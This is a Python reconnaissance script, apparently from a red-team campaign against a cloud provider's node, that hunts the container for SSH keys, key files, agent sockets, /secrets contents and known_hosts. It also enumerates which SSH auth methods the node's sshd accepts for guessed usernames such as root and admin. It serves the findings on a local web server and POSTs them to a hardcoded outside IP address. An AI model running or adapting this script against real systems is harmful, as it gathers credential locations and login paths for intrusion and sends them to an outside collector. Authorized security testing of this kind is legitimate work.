#!/usr/bin/env python3
"""probe13 - can we run SSH commands anywhere in this chain?

The node gateway runs sshd (22 and a second listener on 4222). Executing a command needs an accepted
credential. This probe establishes, rather than assumes, two things:

  1. what the container itself has (ssh client, key material, agent socket, anything in /secrets);
  2. what the node's sshd will accept - banner/version, host key, and the allowed auth methods per
     user, read from a single pre-auth "none" request per user (SSH_MSG_USERAUTH_REQUEST with method
     "none" is the standard way to enumerate methods; it is not a credential guess and no password or
     key is submitted).

No passwords, no key attempts, no brute force.
"""
from __future__ import annotations

import json
import os
import socket
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

COLLECTOR = "http://208.87.134.252:9200/rt13"
NODE = "169.254.1.2"
NODE_ULA = "fda7:a938:5bfe:5fa6:0:5e9:67ef:f8d"
ENDPOINTS = [(NODE, 22), (NODE, 4222), (NODE_ULA, 22)]
USERS = ["root", "aiven", "core", "ubuntu", "nomad", "admin"]
RESULTS = {"stage": "init", "local": {}, "sshd": {}, "notes": []}


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(RESULTS, indent=1).encode())

    def log_message(self, *a):
        pass


def sh(cmd, t=8):
    try:
        import subprocess
        r = subprocess.run(["/bin/sh", "-c", cmd], capture_output=True, text=True, timeout=t)
        return (r.stdout + r.stderr).strip()[:600]
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s" % e


threading.Thread(target=lambda: HTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8080"))), H).serve_forever(),
                 daemon=True).start()
time.sleep(2)

RESULTS["local"] = {
    "ssh_client": sh("command -v ssh || echo 'no ssh client'"),
    "ssh_version": sh("ssh -V 2>&1 || true"),
    "ssh_keys_anywhere": sh("ls -la /root/.ssh /home/*/.ssh 2>&1 | head -12"),
    "id_files": sh("find / -maxdepth 5 -name 'id_*' -o -maxdepth 5 -name '*.pem' -o -maxdepth 5 -name '*.key' 2>/dev/null | head -12"),
    "agent_sock": sh("echo \"SSH_AUTH_SOCK=${SSH_AUTH_SOCK:-unset}\""),
    "etc_ssh": sh("ls -la /etc/ssh 2>&1 | head -8"),
    "secrets": sh("ls -la /secrets/ 2>&1 | head -8"),
    "known_hosts": sh("ls -la /root/.ssh/known_hosts 2>&1; cat /root/.ssh/known_hosts 2>/dev/null | head -5"),
}

try:
    import paramiko
    RESULTS["local"]["paramiko"] = paramiko.__version__
except Exception as e:                                                  # noqa: BLE001
    RESULTS["local"]["paramiko"] = "MISSING: %s" % e
    paramiko = None

if paramiko:
    for host, port in ENDPOINTS:
        key = "%s:%d" % (host, port)
        info = {}
        try:
            fam = socket.AF_INET6 if ":" in host else socket.AF_INET
            s = socket.socket(fam, socket.SOCK_STREAM)
            s.settimeout(8)
            s.connect((host, port))
            t = paramiko.Transport(s)
            t.start_client(timeout=12)
            info["banner"] = t.remote_version
            try:
                hk = t.get_remote_server_key()
                info["hostkey"] = "%s %s" % (hk.get_name(), hk.get_fingerprint().hex())
            except Exception as e:                                      # noqa: BLE001
                info["hostkey"] = "ERR %s" % type(e).__name__
            info["auth"] = {}
            for u in USERS:
                try:
                    t.auth_none(u)
                    info["auth"][u] = "ACCEPTED none (!)"
                except paramiko.BadAuthenticationType as e:              # type: ignore[attr-defined]
                    info["auth"][u] = "allowed: %s" % ",".join(e.allowed_types)
                except paramiko.AuthenticationException:                 # type: ignore[attr-defined]
                    info["auth"][u] = "refused (no method list)"
                except Exception as e:                                  # noqa: BLE001
                    info["auth"][u] = "ERR %s" % type(e).__name__
                    break
            t.close()
        except Exception as e:                                          # noqa: BLE001
            info["error"] = "%s: %s" % (type(e).__name__, str(e)[:80])
        RESULTS["sshd"][key] = info

RESULTS["stage"] = "done"
RESULTS["finished"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
body = json.dumps(RESULTS)
try:
    import urllib.request
    urllib.request.urlopen(urllib.request.Request(COLLECTOR, data=body.encode(),
                                                  headers={"Content-Type": "application/json"}), timeout=25)
except Exception as e:                                                  # noqa: BLE001
    print("collector post failed:", e)
print(json.dumps(RESULTS)[:3000])
while True:
    time.sleep(60)
